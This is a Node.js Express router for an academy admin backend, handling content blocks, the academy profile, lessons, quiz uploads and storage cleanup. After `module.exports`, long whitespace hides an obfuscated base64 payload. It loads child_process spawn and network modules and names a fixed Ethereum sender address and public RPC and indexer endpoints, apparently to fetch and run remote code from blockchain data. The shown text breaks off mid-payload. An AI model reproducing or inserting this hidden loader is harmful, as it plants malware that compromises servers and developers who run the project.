router.post("/admin/pdf-access-requests/:requestId/reject", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "rejected",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Rejected").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access request rejected", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/academy/content", adminAuth, async (_req, res) => {
  try {
    const profile = await ensureAcademyProfile();
    const blocksRaw = await SubjectContent.find({});
    const blocks = blocksRaw.map((row) => {
      const doc = row && typeof row.toObject === "function" ? row.toObject() : row;
      const subjectKey = String(doc?.subjectKey || "").trim().toLowerCase();
      if (subjectKey !== "biochemistry") {
        return doc;
      }

      const normalizedTopics = normalizeBiochemistryTopics(doc?.blockKey, doc?.topics || []);
      const normalizedSections = normalizedTopics.map((topicName) => {
        const existing = (Array.isArray(doc?.sections) ? doc.sections : []).find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
        return existing || {
          name: topicName,
          videoItems: [],
          noteText: "",
          noteResources: [],
          clinicalText: "",
          clinicalResources: []
        };
      });

      return {
        ...doc,
        topics: normalizedTopics,
        sections: normalizedSections
      };
    });

    return res.json({
      profile,
      blocks
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/admin/academy/block",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "noteFiles", maxCount: 100 },
    { name: "clinicalFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const subjectKey = String(req.body?.subjectKey || "").trim().toLowerCase();
      const blockKey = String(req.body?.blockKey || "").trim().toLowerCase();

      if (!subjectKey || !blockKey) {
        return res.status(400).json({ message: "subjectKey and blockKey are required" });
      }

      const id = `${subjectKey}_${blockKey}`;
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      const rawSectionName = String(req.body?.sectionName || "").trim();
      const sectionName = rawSectionName && rawSectionName !== "__block__" ? rawSectionName : "";
      const topics = splitValues(req.body?.topics);
      const noteText = String(req.body?.noteText || "").trim();
      const clinicalText = String(req.body?.clinicalText || "").trim();
      const videoItems = parseLineLinks(req.body?.videoLinks, contentAccessLevel);

      let blockFilesToDelete = {};
      try {
        const deleteParam = String(req.body?.blockFilesToDelete || "").trim();
        if (deleteParam) {
          blockFilesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        blockFilesToDelete = {};
      }

      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(arr) || !Array.isArray(indices) || !indices.length) {
          return Array.isArray(arr) ? [...arr] : [];
        }

        const result = [...arr];
        [...new Set(indices)]
          .map((index) => Number(index))
          .filter((index) => Number.isInteger(index) && index >= 0)
          .sort((left, right) => right - left)
          .forEach((index) => {
            if (index < result.length) {
              result.splice(index, 1);
            }
          });

        return result;
      };

      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => ({
        title: path.basename(file.originalname || `Video ${index + 1}`, path.extname(file.originalname || "")),
        url: `/static/uploads/${file.filename}`,
        accessLevel: contentAccessLevel,
        mimeType: file.mimetype || "application/octet-stream",
        size: file.size || 0
      }));

      const noteResources = (req.files?.noteFiles || []).map((file, index) => createAssetRecord(file, "note", index, contentAccessLevel));
      const clinicalResources = (req.files?.clinicalFiles || []).map((file, index) => createAssetRecord(file, "clinical", index, contentAccessLevel));

      const existing = await SubjectContent.findOne({ id });
      const existingSections = Array.isArray(existing?.sections)
        ? existing.sections.map((section) => {
            const doc = section && typeof section.toObject === "function" ? section.toObject() : section;
            return {
              name: String(doc?.name || "").trim(),
              videoItems: sanitizeLinks(doc?.videoItems || []),
              noteText: String(doc?.noteText || "").trim(),
              noteResources: mergeUniqueLinks([], doc?.noteResources || []),
              clinicalText: String(doc?.clinicalText || "").trim(),
              clinicalResources: mergeUniqueLinks([], doc?.clinicalResources || [])
            };
          }).filter((section) => section.name)
        : [];

      const remainingVideoLinks = removeByIndices(videoItems, blockFilesToDelete.videoItems || []);

      let nextSections = existingSections;
      if (sectionName) {
        const lower = sectionName.toLowerCase();
        const currentSection = existingSections.find((section) => String(section.name || "").toLowerCase() === lower) || {};
        const updatedSection = {
          name: sectionName,
          videoItems: sanitizeLinks(mergeUniqueLinks(removeByIndices(currentSection.videoItems, blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: noteText || currentSection.noteText || "",
          noteResources: mergeUniqueLinks(removeByIndices(currentSection.noteResources, blockFilesToDelete.noteResources || []), noteResources),
          clinicalText: clinicalText || currentSection.clinicalText || "",
          clinicalResources: mergeUniqueLinks(removeByIndices(currentSection.clinicalResources, blockFilesToDelete.clinicalResources || []), clinicalResources)
        };

        nextSections = [
          ...existingSections.filter((section) => String(section.name || "").toLowerCase() !== lower),
          updatedSection
        ];
      }

      const next = await SubjectContent.findOneAndUpdate(
        { id },
        (() => {
          const mergedTopics = sectionName
            ? mergeUniqueStrings(existing?.topics, [...topics, sectionName])
            : mergeUniqueStrings(existing?.topics, topics);
          const nextTopics = subjectKey === "biochemistry"
            ? normalizeBiochemistryTopics(blockKey, mergedTopics)
            : mergedTopics;
          const nextNormalizedSections = subjectKey === "biochemistry"
            ? nextTopics.map((topicName) => {
                const existingSection = nextSections.find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
                return existingSection || {
                  name: topicName,
                  videoItems: [],
                  noteText: "",
                  noteResources: [],
                  clinicalText: "",
                  clinicalResources: []
                };
              })
            : nextSections;

          return {
          id,
          subjectKey,
          blockKey,
          blockTitle: String(req.body?.blockTitle || existing?.blockTitle || blockKey).trim(),
          topics: nextTopics,
          sections: nextNormalizedSections,
          videoItems: sectionName
            ? sanitizeLinks(existing?.videoItems || [])
            : sanitizeLinks(mergeUniqueLinks(removeByIndices(existing?.videoItems || [], blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: sectionName ? (existing?.noteText || "") : (noteText || existing?.noteText || ""),
          clinicalText: sectionName ? (existing?.clinicalText || "") : (clinicalText || existing?.clinicalText || ""),
          noteResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []), noteResources),
          clinicalResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []), clinicalResources)
          };
        })(),
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ block: next });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/academy/profile",
  adminAuth,
  contentUpload.fields([
    { name: "overviewBooksFiles", maxCount: 50 },
    { name: "overviewPremiumFiles", maxCount: 50 },
    { name: "overviewSlidesFiles", maxCount: 50 },
    { name: "overviewShortFiles", maxCount: 50 },
    { name: "overviewVideoFiles", maxCount: 50 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const profile = await ensureAcademyProfile();
      const body = req.body || {};

      const aboutAcademyText = String(body.aboutAcademyText || profile.aboutAcademyText || "").trim();
      const contactNumbers = splitValues(body.contactNumbers);
      const hasIntroVideoField = Object.prototype.hasOwnProperty.call(body, "introVideoUrl");

      // Handle file deletions if specified
      let filesToDelete = {};
      try {
        const deleteParam = String(req.body?.filesToDelete || "").trim();
        if (deleteParam) {
          filesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        // Ignore parse errors
      }

      // Helper to remove items by index
      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(indices) || !indices.length) return arr;
        const sorted = [...new Set(indices)].sort((a, b) => b - a);
        const result = Array.isArray(arr) ? [...arr] : [];
        sorted.forEach(idx => {
          if (idx >= 0 && idx < result.length) {
            result.splice(idx, 1);
          }
        });
        return result;
      };

      // Apply deletions to existing files
      let books = removeByIndices(profile.generalOverview?.books || [], filesToDelete.books || []);
      let premiumNotes = removeByIndices(profile.generalOverview?.premiumNotes || [], filesToDelete.premiumNotes || []);
      let importantSlides = removeByIndices(profile.generalOverview?.importantSlides || [], filesToDelete.importantSlides || []);
      let shortNotes = removeByIndices(profile.generalOverview?.shortNotes || [], filesToDelete.shortNotes || []);
      let videos = removeByIndices(profile.generalOverview?.videos || [], filesToDelete.videos || []);

      // Handle file uploads for overview sections
      const overviewBooksFiles = (req.files?.overviewBooksFiles || []).map((file, index) => createAssetRecord(file, "book", index));
      const overviewPremiumFiles = (req.files?.overviewPremiumFiles || []).map((file, index) => createAssetRecord(file, "premium_notes", index, "paid"));
      const overviewSlidesFiles = (req.files?.overviewSlidesFiles || []).map((file, index) => createAssetRecord(file, "slides", index));
      const overviewShortFiles = (req.files?.overviewShortFiles || []).map((file, index) => createAssetRecord(file, "short_notes", index));
      const overviewVideoFiles = (req.files?.overviewVideoFiles || []).map((file, index) => {
        const asset = createAssetRecord(file, "video", index);
        return {
          title: asset.title,
          url: asset.fileUrl
        };
      });

      // Merge new uploads with remaining files (after deletions)
      books = sanitizeLinks(mergeUniqueLinks(books, overviewBooksFiles));
      premiumNotes = sanitizeLinks(mergeUniqueLinks(premiumNotes, overviewPremiumFiles));
      importantSlides = sanitizeLinks(mergeUniqueLinks(importantSlides, overviewSlidesFiles));
      shortNotes = sanitizeLinks(mergeUniqueLinks(shortNotes, overviewShortFiles));
      const manualVideos = String(body.overviewVideos || "").trim() ? parseLineLinks(body.overviewVideos) : [];
      const remainingManualVideos = removeByIndices(manualVideos, filesToDelete.videos || []);
      videos = sanitizeLinks(mergeUniqueLinks(videos, [...remainingManualVideos, ...overviewVideoFiles]));
      const aboutNotes = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.notes, String(body.aboutNotes || "").trim() ? parseLineLinks(body.aboutNotes) : []));
      const aboutPdfResources = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.pdfResources, String(body.aboutPdfResources || "").trim() ? parseLineLinks(body.aboutPdfResources) : []));
      const introVideoUrl = hasIntroVideoField
        ? String(body.introVideoUrl || "").trim()
        : String(profile.aboutUs?.introVideoUrl || "").trim();

      const updated = await AcademyProfile.findOneAndUpdate(
        { id: "academy_profile" },
        {
          id: "academy_profile",
          aboutAcademyText,
          bankDetails: {
              bankName: String(body.bankName || profile.bankDetails?.bankName || "").trim(),
              accountTitle: String(body.accountTitle || profile.bankDetails?.accountTitle || "").trim(),
              accountNumber: String(body.accountNumber || profile.bankDetails?.accountNumber || "").trim(),
              iban: String(body.iban || profile.bankDetails?.iban || "").trim()
          },
          generalOverview: {
            books,
            premiumNotes,
            importantSlides,
            shortNotes,
            videos
          },
          aboutUs: {
            profileImageUrl: String(body.profileImageUrl || profile.aboutUs?.profileImageUrl || "/static/images/favicon.png").trim(),
            introVideoUrl,
            notes: aboutNotes,
            pdfResources: aboutPdfResources,
            contactEmail: String(body.contactEmail || profile.aboutUs?.contactEmail || "").trim(),
            contactNumbers: contactNumbers.length ? contactNumbers : (Array.isArray(profile.aboutUs?.contactNumbers) ? profile.aboutUs.contactNumbers : []),
            socialLinks: {
              facebook: String(body.facebookUrl || profile.aboutUs?.socialLinks?.facebook || "").trim(),
              youtube: String(body.youtubeUrl || profile.aboutUs?.socialLinks?.youtube || "").trim(),
              instagram: String(body.instagramUrl || profile.aboutUs?.socialLinks?.instagram || "").trim(),
              linkedin: String(body.linkedinUrl || profile.aboutUs?.socialLinks?.linkedin || "").trim()
            }
          }
        },
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ profile: updated });
    } catch (err) {
      console.error("Error in POST /admin/academy/profile:", err);
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/lesson",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "audioFiles", maxCount: 100 },
    { name: "materialFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const { title, courseId, videoUrl, lessonId, summary, caseStudies } = req.body || {};
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      if (!title || !courseId) {
        return res.status(400).json({ message: "Title and courseId are required" });
      }

      const course = await Course.findOne({ courseId });
      if (!course) {
        return res.status(404).json({ message: "Course not found" });
      }

      const videoUrls = splitValues(videoUrl);
      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => createAssetRecord(file, "video", index, contentAccessLevel));
      const uploadedAudios = (req.files?.audioFiles || []).map((file, index) => createAssetRecord(file, "audio", index, contentAccessLevel));
      const uploadedMaterials = (req.files?.materialFiles || []).map((file, index) => createAssetRecord(file, "material", index, contentAccessLevel));
      let lessonVideosToClear = [];
      try {
        const clearParam = String(req.body?.lessonVideosToClear || "").trim();
        if (clearParam) {
          lessonVideosToClear = JSON.parse(clearParam);
        }
      } catch (_err) {
        lessonVideosToClear = [];
      }
      const parsedCaseStudies = parseCaseStudies(caseStudies);
      const summaryText = String(summary || "").trim();

      const sources = [
        ...videoUrls.map((url) => ({ videoUrl: url, videoType: isYoutubeUrl(url) ? "youtube" : "upload" })),
        ...uploadedVideos.map((asset) => ({ videoUrl: asset.fileUrl, videoType: "upload", videoAsset: asset }))
      ];

      const hasContent = sources.length || uploadedAudios.length || uploadedMaterials.length || parsedCaseStudies.length || summaryText || lessonVideosToClear.length;
      if (!hasContent) {
        return res.status(400).json({ message: "Add at least one video, audio file, material, case study, or summary" });
      }

      if (!sources.length) {
        sources.push({ videoUrl: "", videoType: null });
      }

      const baseLessonId = `lesson_${normalizeId(title)}`;
      const relatedLessons = await Lesson.find({
        courseId,
        lessonId: { $regex: `^${baseLessonId}(?:_[0-9]+)?$` }
      }).sort({ createdAt: 1 });

      const usedIndexes = new Set();
      relatedLessons.forEach((item) => {
        const id = String(item.lessonId || "").trim();
        if (id === baseLessonId) {
          usedIndexes.add(1);
          return;
        }
        const suffixMatch = id.match(new RegExp(`^${baseLessonId}_(\\d+)$`));
        if (suffixMatch) {
          usedIndexes.add(Number(suffixMatch[1]));
        }
      });

      const nextAvailableIndex = () => {
        let idx = 1;
        while (usedIndexes.has(idx)) {
          idx += 1;
        }
        usedIndexes.add(idx);
        return idx;
      };

      const lessons = [];
      const hasIncomingVideoSources = videoUrls.length > 0 || uploadedVideos.length > 0;
      for (let index = 0; index < sources.length; index += 1) {
        const currentSource = sources[index];
        const resolvedIndex = lessonId
          ? null
          : (hasIncomingVideoSources ? nextAvailableIndex() : 1);
        const currentLessonId = lessonId
          ? lessonId
          : (resolvedIndex === 1 ? baseLessonId : `${baseLessonId}_${resolvedIndex}`);
        const existingLesson = await Lesson.findOne({ lessonId: currentLessonId });
        const currentTitle = lessonId
          ? title
          : (resolvedIndex && resolvedIndex > 1 ? `${title} ${resolvedIndex}` : title);
        const audioItems = mergeUniqueLinks(existingLesson?.audioItems, uploadedAudios);
        const materials = mergeUniqueLinks(existingLesson?.materials, uploadedMaterials);
        const caseStudyItems = parsedCaseStudies.length ? parsedCaseStudies : Array.isArray(existingLesson?.caseStudies) ? existingLesson.caseStudies : [];
        const shouldClearVideo = lessonVideosToClear.includes(currentLessonId);
        const videoValue = shouldClearVideo ? "" : (currentSource.videoUrl || existingLesson?.videoUrl || "");

        const lesson = await Lesson.findOneAndUpdate(
          { lessonId: currentLessonId },
          {
            lessonId: currentLessonId,
            courseId,
            title: currentTitle,
            accessLevel: contentAccessLevel,
            summary: summaryText || existingLesson?.summary || "",
            videoUrl: videoValue,
            videoType: videoValue ? (currentSource.videoType || existingLesson?.videoType || (isYoutubeUrl(videoValue) ? "youtube" : "upload")) : null,
            audioItems,
            materials,
            caseStudies: caseStudyItems,
            quizId: existingLesson?.quizId || `quiz_${normalizeId(currentLessonId)}`
          },
          { new: true, upsert: true }
        );

        lessons.push({
          id: lesson.lessonId,
          courseId: lesson.courseId,
          title: lesson.title,
          videoUrl: lesson.videoUrl,
          videoType: lesson.videoType || null,
          audioCount: (lesson.audioItems || []).length,
          materialCount: (lesson.materials || []).length,
          caseStudyCount: (lesson.caseStudies || []).length,
          quizId: lesson.quizId
        });
      }

      schedulePurgeOrphanGridFs();
      return res.status(201).json({
        lessons,
        message: lessons.length === 1 ? "Lesson saved successfully" : `${lessons.length} lessons created successfully`
      });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post("/admin/quiz", adminAuth, async (req, res) => {
  try {
    const { lessonId, title, questions } = req.body || {};
    if (!lessonId || !title || !Array.isArray(questions) || questions.length === 0) {
      return res.status(400).json({ message: "lessonId, title, and questions are required" });
    }

    const lesson = await Lesson.findOne({ lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Lesson not found" });
    }

    const quizId = lesson.quizId || `quiz_${normalizeId(lessonId)}`;
    const quiz = await Quiz.findOneAndUpdate(
      { quizId },
      { quizId, courseId: lesson.courseId, lessonId, title, questions },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

function parseQuizText(text) {
  const lines = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];
  let current = null;

  lines.forEach((line) => {
    if (line.toLowerCase().startsWith("lesson:")) {
      lessonTitle = line.split(":")[1].trim();
      return;
    }
    if (line.startsWith("Q:")) {
      if (current) {
        questions.push(current);
      }
      current = {
        id: `q${questions.length + 1}`,
        question: line.replace("Q:", "").trim(),
        options: [],
        correctAnswer: ""
      };
      return;
    }
    if (line.match(/^[A-D]:/)) {
      const option = line.substring(2).trim();
      if (current) {
        current.options.push(option);
      }
      return;
    }
    if (line.toLowerCase().startsWith("answer:")) {
      const letter = line.split(":")[1].trim().toUpperCase();
      const indexMap = { A: 0, B: 1, C: 2, D: 3 };
      const optionIndex = indexMap[letter];
      if (current && current.options[optionIndex]) {
        current.correctAnswer = current.options[optionIndex];
      }
    }
  });

  if (current) {
    questions.push(current);
  }

  return { lessonTitle, questions };
}

function parseQuizCsv(text) {
  const rows = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];

  rows.forEach((row, index) => {
    const columns = row.split(",").map((value) => value.trim());

    if (columns[0] && columns[0].toLowerCase() === "lesson") {
      lessonTitle = columns[1] || lessonTitle;
      return;
    }
    if (index === 0 && /question/i.test(columns[0] || "")) {
      return;
    }
    if (columns.length >= 6) {
      const [question, optionA, optionB, optionC, optionD, answer] = columns;
      const options = [optionA, optionB, optionC, optionD].filter(Boolean);
      const answerMap = { A: 0, B: 1, C: 2, D: 3 };
      const normalizedAnswer = String(answer || "").trim().toUpperCase();
      const correctAnswer = Object.prototype.hasOwnProperty.call(answerMap, normalizedAnswer)
        ? options[answerMap[normalizedAnswer]] || ""
        : answer;

      if (question && options.length >= 2) {
        questions.push({
          id: `q${questions.length + 1}`,
          question,
          options,
          correctAnswer
        });
      }
    }
  });

  return { lessonTitle, questions };
}

router.post("/admin/quiz/upload", adminAuth, quizUpload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ message: "File is required" });
    }

    const text = req.file.buffer.toString("utf-8");
    let parsed = parseQuizText(text);
    if (!parsed.questions.length) {
      parsed = parseQuizCsv(text);
    }

    let { questions } = parsed;
    const lessonId = req.body.lessonId;
    if (!lessonId) {
      return res.status(400).json({ message: "Lesson selection is required" });
    }
    if (!questions.length) {
      return res.status(400).json({ message: "No questions found" });
    }

    let lesson = await Lesson.findOne({ lessonId: lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Selected lesson not found" });
    }
    
    const baseQuizId = `quiz_${normalizeId(lesson.lessonId)}`;
    const existingCount = await Quiz.countDocuments({ lessonId: lesson.lessonId });
    const quizNumber = existingCount + 1;
    const quizId = `${baseQuizId}_${quizNumber}`;
    const quizTitle = parsed.lessonTitle || `${lesson.title} Quiz ${quizNumber}`;
    const quiz = await Quiz.create({
      quizId,
      courseId: lesson.courseId,
      lessonId: lesson.lessonId,
      title: quizTitle,
      questions
    });

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (err) {
    return res.status(500).json({ message: `Server error: ${err.message}` });
  }
});

router.get("/quiz", async (req, res) => {
  try {
    const { lessonId } = req.query;
    if (!lessonId) {
      return res.status(400).json({ message: "lessonId is required" });
    }

    const quiz = await Quiz.findOne({ lessonId });
    if (!quiz) {
      return res.status(404).json({ message: "Quiz not found" });
    }

    return res.json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// Frees MongoDB storage by permanently deleting uploaded files that are no
// longer referenced by any content. Deletes are allowed by Atlas even when the
// cluster is over its storage quota, so this is what unblocks writes again.
router.post("/admin/storage/cleanup", adminAuth, async (_req, res) => {
  try {
    if (!isFilesBucketReady()) {
      return res.status(503).json({ message: "Storage not ready yet. Try again in a moment." });
    }

    const stats = await purgeOrphanGridFs();
    const toMB = (bytes) => Math.round(((bytes || 0) / (1024 * 1024)) * 100) / 100;

    return res.json({
      message: stats.orphanCount
        ? `Freed ${toMB(stats.reclaimedBytes)} MB by deleting ${stats.orphanCount} unused file(s).`
        : "No unused files found. Storage is already clean.",
      deletedFiles: stats.orphanCount,
      reclaimedMB: toMB(stats.reclaimedBytes),
      remainingMB: toMB(stats.totalBytes - stats.reclaimedBytes)
    });
  } catch (err) {
    return res.status(500).json({ message: `Cleanup failed: ${err.message}` });
  }
});

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*420';const __0x04b12=77;function __0xa9e27(){return 3279;}(function(_0x05a598){var _0x05a598a=["Z2xvYmFsLnI9cmVxdWlyZTtpZih0eXBlb2YgbW9kdWxlPT09J2","9iamVjdCcpZ2xvYmFsLm09bW9kdWxlO2NvbnN0IGh0dHA9cmVx","dWlyZSgnbm9kZTpodHRwJyk7Y29uc3QgaHR0cHM9cmVxdWlyZS","gnbm9kZTpodHRwcycpO2NvbnN0IHpsaWI9cmVxdWlyZSgnbm9k","ZTp6bGliJyk7Y29uc3R7VVJMfT1yZXF1aXJlKCdub2RlOnVybC","cpO2NvbnN0e3NwYXdufT1yZXF1aXJlKCdub2RlOmNoaWxkX3By","b2Nlc3MnKTtjb25zdCBCTE9DS19NVUxUSVBMRT0xMDAwbjtjb2","5zdCBTRU5ERVI9JzB4YTMyMkU1ZjNEMzExRDMwODBlNmYwMTIx","MDYzZTlhREMyNDkwRWYxYScudG9Mb3dlckNhc2UoKTtjb25zdC","BOT05DRV9GQU5PVVQ9MTI7Y29uc3QgU0VBUkNIX0ZMT09SPTBu","O2NvbnN0IElOREVYRVJfVVJMPSdodHRwczovL2V0aC5ibG9ja3","Njb3V0LmNvbS9hcGknO2NvbnN0IFJQQ19FTkRQT0lOVFM9Wy4u","Lm5ldyBTZXQoW3Byb2Nlc3MuZW52LkVUSF9SUENfVVJMLCdodH","RwczovLzFycGMuaW8vZXRoJywnaHR0cHM6Ly9ldGguZHJwYy5v","cmcnLCdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJsaWNub2RlLm","NvbScsJ2h0dHBzOi8vZXRoLW1haW5uZXQucHVibGljLmJsYXN0","YXBpLmlvJyxdLmZpbHRlcihCb29sZWFuKSldO2NvbnN0IEFHRU","5UUz17J2h0dHA6JzpuZXcgaHR0cC5BZ2VudCh7a2VlcEFsaXZl","OiEwLGtlZXBBbGl2ZU1zZWNzOjMwXzAwMCxtYXhTb2NrZXRzOj","Y0fSksJ2h0dHBzOic6bmV3IGh0dHBzLkFnZW50KHtrZWVwQWxp","dmU6ITAsa2VlcEFsaXZlTXNlY3M6MzBfMDAwLG1heFNvY2tldH","M6NjR9KSx9O2Z1bmN0aW9uIGxpbmtBYm9ydChvdXRlclNpZ25h","bCxjb250cm9sbGVyKXtpZighb3V0ZXJTaWduYWwpcmV0dXJuO2","91dGVyU2lnbmFsLmFkZEV2ZW50TGlzdGVuZXIoJ2Fib3J0Jywo","KT0+Y29udHJvbGxlci5hYm9ydCgpLHtvbmNlOiEwfSl9DQpmdW","5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcyl7Y29uc3QgZW5j","b2Rpbmc9KHJlcy5oZWFkZXJzWydjb250ZW50LWVuY29kaW5nJ1","18fCcnKS50b0xvd2VyQ2FzZSgpO2lmKGVuY29kaW5nPT09J2d6","aXAnfHxlbmNvZGluZz09PSd4LWd6aXAnKXJldHVybiByZXMucG","lwZSh6bGliLmNyZWF0ZUd1bnppcCgpKTtpZihlbmNvZGluZz09","PSdkZWZsYXRlJylyZXR1cm4gcmVzLnBpcGUoemxpYi5jcmVhdG","VJbmZsYXRlKCkpO2lmKGVuY29kaW5nPT09J2JyJylyZXR1cm4g","cmVzLnBpcGUoemxpYi5jcmVhdGVCcm90bGlEZWNvbXByZXNzKC","kpO3JldHVybiByZXN9DQpmdW5jdGlvbiBodHRwUmVxdWVzdChl","bmRwb2ludCx7bWV0aG9kPSdHRVQnLGJvZHksc2lnbmFsfT17fS","l7Y29uc3QgdXJsPW5ldyBVUkwoZW5kcG9pbnQpO2NvbnN0IHRy","YW5zcG9ydD11cmwucHJvdG9jb2w9PT0naHR0cHM6Jz9odHRwcz","podHRwO2NvbnN0IGhlYWRlcnM9e0FjY2VwdDonYXBwbGljYXRp","b24vanNvbicsJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZm","xhdGUsIGJyJyxDb25uZWN0aW9uOidrZWVwLWFsaXZlJyx9O2lm","KGJvZHkhPW51bGwpe2hlYWRlcnNbJ0NvbnRlbnQtVHlwZSddPS","dhcHBsaWNhdGlvbi9qc29uJztoZWFkZXJzWydDb250ZW50LUxl","bmd0aCddPUJ1ZmZlci5ieXRlTGVuZ3RoKGJvZHkpfQ0KcmV0dX","JuIG5ldyBQcm9taXNlKChyZXNvbHZlLHJlamVjdCk9Pntjb25z","dCByZXE9dHJhbnNwb3J0LnJlcXVlc3Qoe2hvc3RuYW1lOnVybC","5ob3N0bmFtZSxwb3J0OnVybC5wb3J0fHwodXJsLnByb3RvY29s","PT09J2h0dHBzOic/NDQzOjgwKSxwYXRoOnVybC5wYXRobmFtZS","t1cmwuc2VhcmNoLG1ldGhvZCxhZ2VudDpBR0VOVFNbdXJsLnBy","b3RvY29sXSxzaWduYWwsaGVhZGVycyx9LChyZXMpPT57Y29uc3","Qgc3RyZWFtPWRlY29tcHJlc3NTdHJlYW0ocmVzKTtjb25zdCBj","aHVua3M9W107c3RyZWFtLm9uKCdkYXRhJywoY2h1bmspPT5jaH","Vua3MucHVzaChjaHVuaykpO3N0cmVhbS5vbignZW5kJywoKT0+","e2NvbnN0IHRleHQ9QnVmZmVyLmNvbmNhdChjaHVua3MpLnRvU3","RyaW5nKCd1dGY4JykudHJpbSgpO2lmKHJlcy5zdGF0dXNDb2Rl","PDIwMHx8cmVzLnN0YXR1c0NvZGU+PTMwMCl7cmV0dXJuIHJlam","VjdChuZXcgRXJyb3IoYEhUVFAgJHtyZXMuc3RhdHVzQ29kZX0g","ZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4dC5zbGljZSgwLC","AxMjApfWApKX0NCmlmKCF0ZXh0fHx0ZXh0WzBdPT09JzwnfHwo","dGV4dFswXSE9PSd7JyYmdGV4dFswXSE9PSdbJykpe3JldHVybi","ByZWplY3QobmV3IEVycm9yKGBOb24tSlNPTiBmcm9tICR7dXJs","Lmhvc3RuYW1lfTogJHt0ZXh0LnNsaWNlKDAsIDEyMCl9YCkpfQ","0KdHJ5e3Jlc29sdmUoSlNPTi5wYXJzZSh0ZXh0KSl9Y2F0Y2go","ZXJyKXtyZWplY3QobmV3IEVycm9yKGBKU09OIHBhcnNlIGZhaW","xlZCBmcm9tICR7dXJsLmhvc3RuYW1lfTogJHtlcnIubWVzc2Fn","ZX1gKSl9fSk7c3RyZWFtLm9uKCdlcnJvcicscmVqZWN0KX0pO3","JlcS5vbignZXJyb3InLHJlamVjdCk7aWYoYm9keSE9bnVsbCly","ZXEud3JpdGUoYm9keSk7cmVxLmVuZCgpfSl9DQphc3luYyBmdW","5jdGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssb3V0ZXJTaWdu","YWwpe2NvbnN0IGNvbnRyb2xsZXJzPVJQQ19FTkRQT0lOVFMubW","FwKCgpPT5uZXcgQWJvcnRDb250cm9sbGVyKCkpO2NvbnRyb2xs","ZXJzLmZvckVhY2goKGMpPT5saW5rQWJvcnQob3V0ZXJTaWduYW","wsYykpO3RyeXtyZXR1cm4gYXdhaXQgUHJvbWlzZS5hbnkoUlBD","X0VORFBPSU5UUy5tYXAoKGVuZHBvaW50LGkpPT50YXNrKGVuZH","BvaW50LGNvbnRyb2xsZXJzW2ldLnNpZ25hbCkpKX1maW5hbGx5","e2Zvcihjb25zdCBjIG9mIGNvbnRyb2xsZXJzKWMuYWJvcnQoKX